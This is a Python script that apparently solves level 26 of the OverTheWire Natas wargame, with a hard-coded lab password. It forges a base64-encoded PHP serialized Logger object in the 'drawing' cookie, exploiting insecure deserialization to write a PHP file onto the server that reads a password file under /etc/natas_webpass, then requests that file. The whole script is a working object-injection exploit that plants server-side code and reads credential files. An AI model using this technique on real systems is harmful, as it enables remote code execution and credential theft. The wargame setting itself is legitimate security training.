import requests
from base64 import b64encode

with requests.Session() as session:
    url = "http://natas26.natas.labs.overthewire.org/"
    session.auth = ("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T")

    # 1) forge cookie and send it
    target_file = f"img/plop.php"
    content = "<? echo file_get_contents('/etc/natas_webpass/natas27'); ?>"

    # see natas26.php for details
    pwn_drawing_serialized = (
        'a:1:{i:0;O:6:"Logger":3:{s:15:"\0Logger\0logFile";s:'
        + str(len(target_file))
        + ':"'
        + target_file
        + '";s:15:"\0Logger\0initMsg";N;s:15:"\0Logger\0exitMsg";s:'
        + str(len(content))
        + ':"'
        + content
        + '";}}'
    )

    pwn_cookie = {
        "drawing": b64encode(pwn_drawing_serialized.encode()).decode(),
    }

    r = session.get(
        url,
        cookies=pwn_cookie,
    )

    # 2) get password
    r = session.get(url + target_file)

    print(r.content.decode())
